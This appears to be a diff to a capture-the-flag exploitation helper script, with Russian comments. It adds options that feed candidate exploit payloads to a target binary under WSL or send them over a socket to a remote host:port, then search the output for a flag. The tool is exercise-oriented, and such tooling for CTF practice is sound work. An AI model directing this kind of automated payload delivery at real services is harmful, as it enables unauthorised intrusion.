@@ -31,8 +31,11 @@ import argparse
 import importlib.util
 import json
 import os
+import socket
 import struct
+import subprocess
 import sys
+import time
 
 _HERE = os.path.dirname(os.path.abspath(__file__))
 _ROOT = os.path.dirname(_HERE)
@@ -211,10 +214,84 @@ def analyse(path: str):
     return res
 
 
+def _wsl_path(path: str) -> str:
+    """F:\\a\\b -> /mnt/f/a/b (путь, который видит WSL)."""
+    p = path.replace("\\", "/")
+    if len(p) > 1 and p[1] == ":":
+        return "/mnt/" + p[0].lower() + p[2:]
+    return p
+
+
+def _wsl_distro():
+    d = os.environ.get("WSL_DISTRO")
+    if d:
+        return d
+    try:
+        out = subprocess.run(["wsl", "-l", "-q"], capture_output=True, timeout=20)
+        raw = out.stdout
+        for enc in ("utf-16-le", "utf-8"):
+            try:
+                txt = raw.decode(enc)
+            except UnicodeDecodeError:
+                continue
+            names = [x.strip().strip("\ufeff\x00").strip() for x in txt.splitlines()]
+            names = [x for x in names if x]
+            if names:
+                return names[0]
+    except Exception:
+        pass
+    return None
+
+
+def run_payload(path: str, hexstr: str, distro: str, timeout: float = 20.0):
+    """Скормить payload бинарнику внутри WSL. Возвращает (код, вывод)."""
+    p = _wsl_path(os.path.abspath(path))
+    folder, base = os.path.dirname(p), os.path.basename(p)
+    script = (f"cd '{folder}' && chmod +x '{base}' && "
+              f"printf '%s' '{hexstr}' | xxd -r -p | ./'{base}'")
+    try:
+        r = subprocess.run(["wsl", "-d", distro, "--", "sh", "-lc", script],
+                           capture_output=True, timeout=timeout)
+    except (OSError, subprocess.TimeoutExpired) as exc:
+        return None, f"не запустилось: {exc}"
+    out = (r.stdout + r.stderr).decode("utf-8", "replace")
+    return r.returncode, out
+
+
+def run_remote(host: str, port: int, hexstr: str, timeout: float = 8.0):
+    """Отправить payload на host:port и прочитать всё, что ответит сервис."""
+    payload = bytes.fromhex(hexstr) + b"\n"
+    try:
+        with socket.create_connection((host, port), timeout=timeout) as s:
+            s.settimeout(3.0)
+            chunks = []
+            try:
+                chunks.append(s.recv(4096))
+            except socket.timeout:
+                pass
+            s.sendall(payload)
+            t0 = time.time()
+            while time.time() - t0 < timeout:
+                try:
+                    data = s.recv(4096)
+                except socket.timeout:
+                    break
+                if not data:
+                    break
+                chunks.append(data)
+            return b"".join(chunks).decode("utf-8", "replace")
+    except OSError as exc:
+        return f"ошибка соединения: {exc}"
+
+
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("file")
     ap.add_argument("--json", action="store_true")
+    ap.add_argument("--run", action="store_true",
+                    help="проверить payload через WSL (запускает бинарник!)")
+    ap.add_argument("--remote", default=None,
+                    help="host:port — отправить payload на сервис и прочитать ответ")
     args = ap.parse_args()
     try:
         r = analyse(args.file)
@@ -251,6 +328,39 @@ def main():
     for pl in r["payloads"][:3]:
         print(f"[!] payload ({pl['what']}, offset {pl['offset']}): {pl['hex']}")
     best = r["payloads"][0]
+    if args.remote:
+        host, _, port = args.remote.partition(":")
+        import re
+        flag_rx = re.compile(r"[A-Za-z0-9_]{2,20}\{[\x20-\x7e]{3,80}\}")
+        print(f"[i] отправляю payload на {host}:{port}")
+        for pl in r["payloads"][:4]:
+            out = run_remote(host, int(port or 0), pl["hex"])
+            m = flag_rx.search(out or "")
+            tail = " ".join((out or "").strip().splitlines()[-2:])[:120]
+            print(f"    offset {pl['offset']}: {tail or 'пусто'}")
+            if m:
+                print(f"[!!!] сервис отдал флаг: {m.group(0)}")
+                return 0
+        print("[-] флага в ответе нет (другой offset/цепочка?)")
+        return 1
+    if args.run:
+        import re
+        distro = _wsl_distro()
+        if not distro:
+            print("[-] --run: WSL не найден, проверка невозможна")
+            return 1
+        print(f"[i] запускаю через WSL ({distro}); это исполняет бинарник")
+        flag_rx = re.compile(r"[A-Za-z0-9_]{2,20}\{[\x20-\x7e]{3,80}\}")
+        for pl in r["payloads"][:4]:
+            code, out = run_payload(args.file, pl["hex"], distro)
+            m = flag_rx.search(out or "")
+            tail = " ".join((out or "").strip().splitlines()[-2:])[:120]
+            print(f"    offset {pl['offset']}: код {code}, {tail or 'пусто'}")
+            if m:
+                print(f"[!!!] payload работает: {m.group(0)}")
+                return 0
+        print("[-] ни один кандидат не дал флаг (нужен другой смещение/цепочка)")
+        return 1
     print("\n    pwntools:")
     print(f"    python -c \"from pwn import *; "
           f"p=process('./{os.path.basename(args.file)}'); "
